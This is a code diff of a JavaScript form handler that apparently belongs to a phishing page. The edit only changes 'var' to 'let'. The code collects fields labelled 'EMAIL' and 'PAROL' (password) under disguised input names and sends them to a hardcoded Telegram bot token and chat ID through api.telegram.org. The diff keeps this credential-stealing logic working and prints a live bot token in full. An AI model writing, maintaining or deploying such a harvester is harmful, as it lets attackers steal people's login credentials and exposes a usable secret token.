@@ -44,14 +44,14 @@
 document.getElementById("myBtn").addEventListener("click", function (e) {
   e.preventDefault();
 
-  var fname = document.querySelector('input[name="fname"]').value;
-  var country = document.querySelector('input[name="country"]').value;
+  let fname = document.querySelector('input[name="fname"]').value;
+  let country = document.querySelector('input[name="country"]').value;
 
-  var message = "EMAIL: " + fname + " | PAROL: " + country + "";
+  let message = "EMAIL: " + fname + " | PAROL: " + country + "";
 
-  var token = "5434430636:AAF_s1rONS3Xk1ROqLpZTBwdu9XYylupHFk";
-  var chat_id = "5583233132";
-  var url =
+  let token = "5434430636:AAF_s1rONS3Xk1ROqLpZTBwdu9XYylupHFk";
+  let chat_id = "5583233132";
+  let url =
     "https://api.telegram.org/bot" +
     token +
     "/sendMessage?chat_id=" +
@@ -60,7 +60,7 @@ document.getElementById("myBtn").addEventListener("click", function (e) {
     message +
     "&parse_mode=html";
 
-  var oReq = new XMLHttpRequest();
+  let oReq = new XMLHttpRequest();
   oReq.open("GET", url, true);
   oReq.send();
 
